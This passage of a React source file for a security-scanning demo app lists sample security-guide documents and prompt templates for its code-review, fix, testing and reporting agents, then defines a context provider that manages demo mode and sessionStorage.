        { id: "doc-1", name: "OWASP SQL Injection Prevention Cheat Sheet.pdf", size: "856 KB", type: "pdf", folder: null },
        { id: "doc-2", name: "Parameterized Queries Guide.pdf", size: "1.1 MB", type: "pdf", folder: null },
        { id: "doc-3", name: "Node.js Database Security.pdf", size: "512 KB", type: "pdf", folder: "Node.js" },
        { id: "doc-4", name: "Python SQLAlchemy Security.pdf", size: "678 KB", type: "pdf", folder: "Python" },
        { id: "doc-5", name: "Java Hibernate Secure Queries.pdf", size: "934 KB", type: "pdf", folder: "Java" },
    ],
    "demo-xss": [
        { id: "doc-6", name: "XSS Prevention Guide.pdf", size: "923 KB", type: "pdf", folder: null },
        { id: "doc-7", name: "Content Security Policy Implementation.pdf", size: "876 KB", type: "pdf", folder: null },
        { id: "doc-8", name: "React XSS Prevention.pdf", size: "534 KB", type: "pdf", folder: "Frontend" },
        { id: "doc-9", name: "Angular Security Context.pdf", size: "467 KB", type: "pdf", folder: "Frontend" },
    ],
    "demo-auth": [
        { id: "doc-10", name: "Password Hashing Best Practices.pdf", size: "654 KB", type: "pdf", folder: null },
        { id: "doc-11", name: "JWT Security Guide.pdf", size: "789 KB", type: "pdf", folder: "Tokens" },
        { id: "doc-12", name: "OAuth 2.0 Implementation.pdf", size: "1.2 MB", type: "pdf", folder: "OAuth" },
        { id: "doc-13", name: "Multi-Factor Authentication Setup.pdf", size: "456 KB", type: "pdf", folder: "MFA" },
        { id: "doc-14", name: "Session Management Security.pdf", size: "567 KB", type: "pdf", folder: "Sessions" },
        { id: "doc-15", name: "Bcrypt vs Argon2 Comparison.pdf", size: "345 KB", type: "pdf", folder: null },
    ],
    "demo-secrets": [
        { id: "doc-16", name: "Environment Variables Guide.pdf", size: "345 KB", type: "pdf", folder: null },
        { id: "doc-17", name: "AWS Secrets Manager Tutorial.pdf", size: "867 KB", type: "pdf", folder: "AWS" },
        { id: "doc-18", name: "HashiCorp Vault Setup.pdf", size: "1.1 MB", type: "pdf", folder: "Vault" },
        { id: "doc-19", name: "CI/CD Secrets Best Practices.pdf", size: "523 KB", type: "pdf", folder: "CI/CD" },
    ],
    "demo-api-security": [
        { id: "doc-20", name: "REST API Security Checklist.pdf", size: "678 KB", type: "pdf", folder: null },
        { id: "doc-21", name: "GraphQL Security Guide.pdf", size: "892 KB", type: "pdf", folder: "GraphQL" },
        { id: "doc-22", name: "Rate Limiting Implementation.pdf", size: "456 KB", type: "pdf", folder: null },
        { id: "doc-23", name: "API Gateway Security.pdf", size: "734 KB", type: "pdf", folder: null },
        { id: "doc-24", name: "CORS Configuration Guide.pdf", size: "389 KB", type: "pdf", folder: null },
    ],
    "demo-compliance": [
        { id: "doc-25", name: "OWASP Top 10 2021 Overview.pdf", size: "1.5 MB", type: "pdf", folder: "OWASP" },
        { id: "doc-26", name: "OWASP Testing Guide v4.pdf", size: "2.3 MB", type: "pdf", folder: "OWASP" },
        { id: "doc-27", name: "PCI-DSS v4.0 Requirements.pdf", size: "1.8 MB", type: "pdf", folder: "PCI-DSS" },
        { id: "doc-28", name: "PCI-DSS Code Review Checklist.pdf", size: "567 KB", type: "pdf", folder: "PCI-DSS" },
        { id: "doc-29", name: "SOC 2 Security Controls.pdf", size: "1.2 MB", type: "pdf", folder: "SOC2" },
        { id: "doc-30", name: "GDPR Developer Guide.pdf", size: "934 KB", type: "pdf", folder: "GDPR" },
        { id: "doc-31", name: "GDPR Data Protection Checklist.pdf", size: "456 KB", type: "pdf", folder: "GDPR" },
        { id: "doc-32", name: "Security Audit Template.pdf", size: "678 KB", type: "pdf", folder: null },
    ],
    "demo-crypto": [
        { id: "doc-33", name: "AES Encryption Implementation.pdf", size: "756 KB", type: "pdf", folder: null },
        { id: "doc-34", name: "RSA Key Management Guide.pdf", size: "834 KB", type: "pdf", folder: "Keys" },
        { id: "doc-35", name: "TLS 1.3 Configuration.pdf", size: "623 KB", type: "pdf", folder: "TLS" },
        { id: "doc-36", name: "Hashing Algorithms Comparison.pdf", size: "512 KB", type: "pdf", folder: null },
        { id: "doc-37", name: "Key Rotation Best Practices.pdf", size: "445 KB", type: "pdf", folder: "Keys" },
    ],
    "demo-logging": [
        { id: "doc-38", name: "Security Logging Standards.pdf", size: "678 KB", type: "pdf", folder: null },
        { id: "doc-39", name: "Audit Trail Implementation.pdf", size: "723 KB", type: "pdf", folder: null },
        { id: "doc-40", name: "SIEM Integration Guide.pdf", size: "856 KB", type: "pdf", folder: "SIEM" },
        { id: "doc-41", name: "Log Redaction Patterns.pdf", size: "389 KB", type: "pdf", folder: null },
    ],
    "demo-container": [
        { id: "doc-42", name: "Docker Security Hardening.pdf", size: "923 KB", type: "pdf", folder: "Docker" },
        { id: "doc-43", name: "Kubernetes RBAC Guide.pdf", size: "1.1 MB", type: "pdf", folder: "K8s" },
        { id: "doc-44", name: "Container Image Scanning.pdf", size: "678 KB", type: "pdf", folder: null },
        { id: "doc-45", name: "K8s Network Policies.pdf", size: "534 KB", type: "pdf", folder: "K8s" },
        { id: "doc-46", name: "Pod Security Standards.pdf", size: "445 KB", type: "pdf", folder: "K8s" },
        { id: "doc-47", name: "Secrets in Containers.pdf", size: "512 KB", type: "pdf", folder: null },
    ],
    "demo-cloud": [
        { id: "doc-48", name: "AWS Security Best Practices.pdf", size: "1.2 MB", type: "pdf", folder: "AWS" },
        { id: "doc-49", name: "AWS IAM Policy Guide.pdf", size: "856 KB", type: "pdf", folder: "AWS" },
        { id: "doc-50", name: "Azure Security Center.pdf", size: "934 KB", type: "pdf", folder: "Azure" },
        { id: "doc-51", name: "GCP Security Foundations.pdf", size: "1.1 MB", type: "pdf", folder: "GCP" },
        { id: "doc-52", name: "VPC Security Design.pdf", size: "678 KB", type: "pdf", folder: null },
        { id: "doc-53", name: "Cloud Encryption Guide.pdf", size: "567 KB", type: "pdf", folder: null },
        { id: "doc-54", name: "CSPM Implementation.pdf", size: "723 KB", type: "pdf", folder: null },
    ],
    "demo-secure-sdlc": [
        { id: "doc-55", name: "Threat Modeling Guide.pdf", size: "934 KB", type: "pdf", folder: null },
        { id: "doc-56", name: "Security Requirements Template.pdf", size: "456 KB", type: "pdf", folder: null },
        { id: "doc-57", name: "Code Review Checklist.pdf", size: "389 KB", type: "pdf", folder: "Review" },
        { id: "doc-58", name: "SAST Tool Integration.pdf", size: "678 KB", type: "pdf", folder: "Testing" },
        { id: "doc-59", name: "DAST Implementation Guide.pdf", size: "756 KB", type: "pdf", folder: "Testing" },
    ],
    "demo-mobile": [
        { id: "doc-60", name: "iOS Keychain Security.pdf", size: "623 KB", type: "pdf", folder: "iOS" },
        { id: "doc-61", name: "Android Secure Storage.pdf", size: "678 KB", type: "pdf", folder: "Android" },
        { id: "doc-62", name: "Certificate Pinning Guide.pdf", size: "512 KB", type: "pdf", folder: null },
        { id: "doc-63", name: "OWASP Mobile Top 10.pdf", size: "856 KB", type: "pdf", folder: null },
    ],
    "demo-incident": [
        { id: "doc-64", name: "Incident Response Playbook.pdf", size: "934 KB", type: "pdf", folder: null },
        { id: "doc-65", name: "Forensic Evidence Collection.pdf", size: "678 KB", type: "pdf", folder: null },
        { id: "doc-66", name: "Breach Notification Timeline.pdf", size: "345 KB", type: "pdf", folder: null },
    ],
    "demo-devsecops": [
        { id: "doc-67", name: "CI/CD Security Gates.pdf", size: "756 KB", type: "pdf", folder: null },
        { id: "doc-68", name: "Pipeline Hardening Guide.pdf", size: "623 KB", type: "pdf", folder: null },
        { id: "doc-69", name: "SCA Integration Tutorial.pdf", size: "534 KB", type: "pdf", folder: "Tools" },
        { id: "doc-70", name: "Secrets Detection in Code.pdf", size: "445 KB", type: "pdf", folder: "Tools" },
        { id: "doc-71", name: "IaC Security Scanning.pdf", size: "678 KB", type: "pdf", folder: "Tools" },
    ],
    "demo-access-control": [
        { id: "doc-72", name: "RBAC Implementation Guide.pdf", size: "756 KB", type: "pdf", folder: null },
        { id: "doc-73", name: "ABAC Policy Patterns.pdf", size: "678 KB", type: "pdf", folder: null },
        { id: "doc-74", name: "Least Privilege Principles.pdf", size: "534 KB", type: "pdf", folder: null },
        { id: "doc-75", name: "Policy Engine Integration.pdf", size: "623 KB", type: "pdf", folder: "Engines" },
    ],
};

// =============================================
// DEMO PROMPTS (Expanded for each agent)
// =============================================
const DEMO_PROMPTS = {
    reviewer: [
        {
            id: "demo-prompt-1",
            title: "Security Code Review",
            text: "Analyze the provided code for security vulnerabilities. Focus on OWASP Top 10 issues including injection flaws, broken authentication, sensitive data exposure, and security misconfigurations. Provide severity ratings and line-specific findings.",
            order: 0,
            isDefault: true,
        },
        {
            id: "demo-prompt-2",
            title: "Deep Vulnerability Scan",
            text: "Perform a comprehensive security analysis identifying all potential vulnerabilities, their attack vectors, and potential impact. Include CVE references where applicable.",
            order: 1,
            isDefault: true,
        },
        {
            id: "demo-prompt-3",
            title: "SQL Injection Analysis",
            text: "Focus specifically on SQL injection vulnerabilities. Identify all database query patterns, classify injection types (in-band, blind, out-of-band), and assess exploitability.",
            order: 2,
            isDefault: true,
        },
        {
            id: "demo-prompt-4",
            title: "Authentication Review",
            text: "Review authentication and authorization mechanisms. Check for weak password policies, insecure session management, JWT vulnerabilities, and missing access controls.",
            order: 3,
        },
        {
            id: "demo-prompt-5",
            title: "Cryptographic Assessment",
            text: "Evaluate cryptographic implementations. Identify weak algorithms, hardcoded secrets, improper key management, and insecure random number generation.",
            order: 4,
        },
        {
            id: "demo-prompt-6",
            title: "Dependency Audit",
            text: "Check for vulnerable dependencies. Cross-reference with CVE databases, identify outdated packages, and highlight transitive dependency risks.",
            order: 5,
        },
    ],
    implementation: [
        {
            id: "demo-prompt-7",
            title: "Generate Secure Fix",
            text: "Generate secure code to remediate the identified vulnerabilities. Follow security best practices and include comments explaining the security improvements. Maintain code functionality while eliminating security risks.",
            order: 0,
            isDefault: true,
        },
        {
            id: "demo-prompt-8",
            title: "Refactor for Security",
            text: "Refactor the vulnerable code following secure coding guidelines. Implement input validation, output encoding, parameterized queries, and proper error handling.",
            order: 1,
            isDefault: true,
        },
        {
            id: "demo-prompt-9",
            title: "Parameterize SQL Queries",
            text: "Convert all raw SQL queries to parameterized queries or ORM methods. Ensure proper type checking and prevent SQL injection while maintaining query functionality.",
            order: 2,
            isDefault: true,
        },
        {
            id: "demo-prompt-10",
            title: "Implement Input Validation",
            text: "Add comprehensive input validation using whitelist approach. Implement schema validation, type checking, length limits, and format validation for all user inputs.",
            order: 3,
        },
        {
            id: "demo-prompt-11",
            title: "Secure Authentication Flow",
            text: "Rewrite authentication with bcrypt/argon2 hashing, secure session management, CSRF protection, and rate limiting. Include password strength requirements.",
            order: 4,
        },
        {
            id: "demo-prompt-12",
            title: "Add Security Headers",
            text: "Implement security headers including CSP, X-Frame-Options, X-Content-Type-Options, HSTS, and configure CORS properly. Include middleware setup code.",
            order: 5,
        },
    ],
    tester: [
        {
            id: "demo-prompt-13",
            title: "Full Penetration Test",
            text: "Run a comprehensive penetration test using Semgrep (SAST), njsscan (Node.js scanner), Nuclei (DAST), and Bedrock Claude AI. Identify OWASP Top 10 issues, framework-specific vulnerabilities, and complex exploit chains.",
            order: 0,
            isDefault: true,
        },
        {
            id: "demo-prompt-14",
            title: "Deep SAST Analysis",
            text: "Focus on static analysis using Semgrep and njsscan. Scan for injection flaws, hardcoded secrets, prototype pollution, insecure eval usage, ReDoS, and framework-specific misconfigurations. Merge and deduplicate findings.",
            order: 1,
            isDefault: true,
        },
        {
            id: "demo-prompt-15",
            title: "AI Exploit Chain Analysis",
            text: "Use Bedrock Claude AI to reason about multi-step exploit chains, business logic vulnerabilities, race conditions, and attack surface mapping. Identify issues that static tools miss.",
            order: 2,
            isDefault: true,
        },
        {
            id: "demo-prompt-16",
            title: "DAST Endpoint Scan",
            text: "Run Nuclei dynamic scanning against the target URL with community templates. Test for exposed admin panels, misconfigured headers, SSL issues, and known CVE patterns.",
            order: 3,
        },
        {
            id: "demo-prompt-17",
            title: "Dependency Security Audit",
            text: "Analyze all imported packages and dependencies for known CVEs, insecure usage patterns, and supply chain risks. Cross-reference with NVD and GitHub Advisory databases.",
            order: 4,
        },
    ],
    report: [
        {
            id: "demo-prompt-18",
            title: "Executive Summary Report",
            text: "Generate an executive summary of the security findings, remediation steps taken, and verification results. Include risk ratings, business impact, and recommendations for further security improvements.",
            order: 0,
            isDefault: true,
        },
        {
            id: "demo-prompt-19",
            title: "Technical Findings Report",
            text: "Create a detailed technical report with vulnerability descriptions, affected code locations, attack scenarios, remediation code, and verification evidence.",
            order: 1,
            isDefault: true,
        },
        {
            id: "demo-prompt-20",
            title: "Compliance Report",
            text: "Generate a compliance-focused report mapping findings to OWASP Top 10, PCI-DSS requirements, and SOC 2 controls. Include remediation status and evidence.",
            order: 2,
            isDefault: true,
        },
        {
            id: "demo-prompt-21",
            title: "Developer Remediation Guide",
            text: "Create a developer-friendly guide explaining each vulnerability, why it's dangerous, how to fix it with code examples, and best practices to prevent recurrence.",
            order: 3,
        },
        {
            id: "demo-prompt-22",
            title: "Risk Assessment Matrix",
            text: "Generate a risk assessment with CVSS scores, likelihood ratings, business impact analysis, and prioritized remediation roadmap with effort estimates.",
            order: 4,
        },
    ],
};

// =============================================
// DEMO CONTEXT PROVIDER
// =============================================
export function DemoProvider({ children }) {
    const pathname = usePathname();

    // SECURITY: Derive demo mode from pathname, not state
    // This ensures demo mode cannot be manipulated via React devtools
    const isDemoMode = isDemoPath(pathname);

    const [currentDemoProject, setCurrentDemoProject] = useState(() => {
        if (typeof window === 'undefined') return "demo-org/vulnerable-express-app";
        try {
            const saved = sessionStorage.getItem('vulniq_demo_current_project');
            return saved && DEMO_PROJECTS[saved] ? saved : "demo-org/vulnerable-express-app";
        } catch { return "demo-org/vulnerable-express-app"; }
    });



    // Clean up demo storage when exiting demo mode
    useEffect(() => {
        // Track previous demo mode state
        const wasInDemoMode = sessionStorage.getItem('vulniq_was_demo_mode') === 'true';

        if (isDemoMode) {
            sessionStorage.setItem('vulniq_was_demo_mode', 'true');
        } else if (wasInDemoMode && !isDemoMode) {
            // User exited demo mode - clear all demo data
            clearDemoStorage();
            sessionStorage.removeItem('vulniq_was_demo_mode');
        }
    }, [isDemoMode, pathname]);

    // Note: enableDemoMode/disableDemoMode are kept for backwards compatibility
    // but they no longer do anything - demo mode is now derived from pathname
    const enableDemoMode = useCallback(() => {
        console.warn('[DemoContext] enableDemoMode is deprecated. Demo mode is now derived from pathname.');
    }, []);

    const disableDemoMode = useCallback(() => {
        console.warn('[DemoContext] disableDemoMode is deprecated. Demo mode is now derived from pathname.');
        // Clear demo storage when explicitly called
        clearDemoStorage();
    }, []);

    const switchDemoProject = useCallback((projectFullName) => {
        if (DEMO_PROJECTS[projectFullName]) {
            setCurrentDemoProject(projectFullName);
            try { sessionStorage.setItem('vulniq_demo_current_project', projectFullName); } catch {}
            return DEMO_PROJECTS[projectFullName];
        }
        return null;
    }, []);

    const getDemoCode = useCallback(() => DEMO_CODE, []);
    const getDemoProjectStructure = useCallback(() =>
        DEMO_PROJECTS[currentDemoProject] || DEMO_PROJECT_STRUCTURE,
        [currentDemoProject]);
    const getDemoUseCases = useCallback(() => DEMO_USE_CASES, []);
    const getDemoDocuments = useCallback(() => DEMO_DOCUMENTS, []);
    const getDemoPrompts = useCallback(() => DEMO_PROMPTS, []);
    const getDemoGithubRepos = useCallback(() => DEMO_GITHUB_REPOS, []);
    const getDemoGitlabRepos = useCallback(() => DEMO_GITLAB_REPOS, []);
    const getDemoProjects = useCallback(() => DEMO_PROJECTS, []);
    const getDemoResultsForRepo = useCallback((repoFullName) => {
        const vulnMap = DEMO_RESULTS_MAP[repoFullName] || DEMO_RESULTS_MAP["demo-org/vulnerable-express-app"];
        // Flatten the file-keyed vulnerability map into a flat array suitable for the Results component
        const flatVulns = [];
        let idx = 1;
        for (const [fileName, vulns] of Object.entries(vulnMap)) {
            for (const v of vulns) {
                flatVulns.push({
                    id: idx++,
                    severity: v.severity,
                    title: v.title,
                    type: v.cweId || "CWE-000",
                    details: v.details,
                    fileName,
                    cweId: v.cweId,
                    lineNumber: v.lineNumber,
                    vulnerableCode: v.vulnerableCode || "",
                    explanation: v.explanation,
                    bestPractices: v.bestPractices,
                    confidence: v.confidence ?? null,
                    cvssScore: v.cvssScore ?? null,
                    cvssVector: v.cvssVector || null,
                    cvssAnalysis: v.cvssAnalysis || null,
                    exploitExamples: v.exploitExamples || null,
                    exploitSections: v.exploitSections || null,
                    attackPath: v.attackPath || null,
                    dataFlow: v.dataFlow || null,
                    debateLog: v.debateLog || null,
                    references: v.references || null,
                    documentReferences: v.documentReferences || null,
                });
            }
        }
        return flatVulns;
    }, []);
    const getDemoWorkflowConfig = useCallback((repoFullName) => {
        return DEMO_WORKFLOW_CONFIGS[repoFullName] || DEMO_WORKFLOW_CONFIGS["demo-org/vulnerable-express-app"];
    }, []);

    return (
        <DemoContext.Provider
            value={{
                isDemoMode,
                enableDemoMode,
                disableDemoMode,
                currentDemoProject,
                switchDemoProject,
                getDemoCode,
                getDemoProjectStructure,
                getDemoUseCases,
                getDemoDocuments,
                getDemoPrompts,
                getDemoGithubRepos,
                getDemoGitlabRepos,
                getDemoProjects,
                getDemoResultsForRepo,
                getDemoWorkflowConfig,
                // Export constants for direct access
                DEMO_CODE,
                DEMO_PROJECT_STRUCTURE,
                DEMO_USE_CASES,
                DEMO_USE_CASE_GROUPS,
                DEMO_DOCUMENTS,
                DEMO_PROMPTS,
                DEMO_GITHUB_REPOS,
                DEMO_GITLAB_REPOS,
                DEMO_PROJECTS,
                DEMO_VULNERABILITIES,
                DEMO_RESULTS_MAP,
                DEMO_WORKFLOW_CONFIGS,
            }}
        >
            {children}
        </DemoContext.Provider>
    );
}

export function useDemo() {
    const context = useContext(DemoContext);
    if (!context) {
        throw new Error('useDemo must be used within a DemoProvider');
    }
    return context;
}

export {
    DEMO_CODE,
    DEMO_PROJECT_STRUCTURE,
    DEMO_USE_CASES,
    DEMO_USE_CASE_GROUPS,
    DEMO_DOCUMENTS,
    DEMO_PROMPTS,
    DEMO_GITHUB_REPOS,
    DEMO_GITLAB_REPOS,
    DEMO_PROJECTS,
    DEMO_VULNERABILITIES,
    DEMO_RESULTS_MAP,
    DEMO_WORKFLOW_CONFIGS,
};
